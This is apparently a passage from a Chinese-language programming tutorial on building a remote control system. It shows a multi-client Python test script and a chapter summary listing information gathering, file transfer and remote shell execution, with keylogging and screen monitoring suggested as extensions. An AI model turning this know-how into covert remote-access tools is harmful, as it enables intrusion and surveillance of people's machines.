+<span class="line"><span style="color:#E1E4E8">    threads </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> []</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # 创建5个客户端</span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> i </span><span style="color:#F97583">in</span><span style="color:#79B8FF"> range</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">):</span></span>
+<span class="line"><span style="color:#E1E4E8">        client </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> TestClient(i </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> client.connect() </span><span style="color:#F97583">and</span><span style="color:#E1E4E8"> client.send_online():</span></span>
+<span class="line"><span style="color:#E1E4E8">            clients.append(client)</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#6A737D">            # 在单独线程中运行</span></span>
+<span class="line"><span style="color:#E1E4E8">            thread </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> threading.Thread(</span><span style="color:#FFAB70">target</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">client.simulate_activity)</span></span>
+<span class="line"><span style="color:#E1E4E8">            threads.append(thread)</span></span>
+<span class="line"><span style="color:#E1E4E8">            thread.start()</span></span>
+<span class="line"><span style="color:#E1E4E8">            </span></span>
+<span class="line"><span style="color:#E1E4E8">            time.sleep(</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">)  </span><span style="color:#6A737D"># 间隔1秒连接</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # 等待所有线程完成</span></span>
+<span class="line"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> thread </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> threads:</span></span>
+<span class="line"><span style="color:#E1E4E8">        thread.join()</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Multi-client test completed"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">def</span><span style="color:#B392F0"> test_commands</span><span style="color:#E1E4E8">():</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"=== Testing Commands ==="</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#6A737D">    # 这里可以添加更多命令测试</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] Command test completed"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F97583">if</span><span style="color:#79B8FF"> __name__</span><span style="color:#F97583"> ==</span><span style="color:#9ECBFF"> "__main__"</span><span style="color:#E1E4E8">:</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"========================================"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"     Remote Control System Test         "</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"========================================"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # 测试多客户端连接</span></span>
+<span class="line"><span style="color:#E1E4E8">    test_multiple_clients()</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    # 测试命令执行</span></span>
+<span class="line"><span style="color:#E1E4E8">    test_commands()</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#79B8FF">    print</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[*] All tests completed"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line"></span></code></pre><h2 id="section-10">章节总结</h2><p>本章完成了远程控制系统的核心功能实现：</p><ol><li><strong>通信基础</strong>：建立了稳定的客户端-服务端通信机制</li><li><strong>信息收集</strong>：实现了系统信息、进程列表、文件列表的获取</li><li><strong>文件传输</strong>：支持双向文件传输（上传和下载）</li><li><strong>远程执行</strong>：实现了远程Shell命令执行和输出回显</li></ol><h3 id="section-11">系统特点</h3><ul><li><strong>模块化设计</strong>：各功能模块独立，易于扩展和维护</li><li><strong>稳定通信</strong>：采用TCP协议保证数据传输可靠性</li><li><strong>实时响应</strong>：支持命令实时执行和结果回传</li><li><strong>多客户端</strong>：支持同时管理多个被控端</li></ul><h3 id="section-12">可扩展方向</h3><ol><li><strong>安全性增强</strong>：添加加密通信和身份认证</li><li><strong>功能扩展</strong>：屏幕监控、键盘记录、文件管理等</li><li><strong>性能优化</strong>：并发处理、资源管理优化</li><li><strong>用户体验</strong>：图形界面、命令历史、自动补全等</li></ol><h2 id="section-13">课后作业</h2><h3 id="section-14">作业1：添加加密通信</h3><p>为通信协议添加AES加密功能。</p><h3 id="section-15">作业2：实现图形界面</h3><p>使用Qt或MFC开发图形化的控制端界面。</p><h3 id="section-16">作业3：添加插件系统</h3><p>设计插件架构，支持功能模块的动态加载。</p>
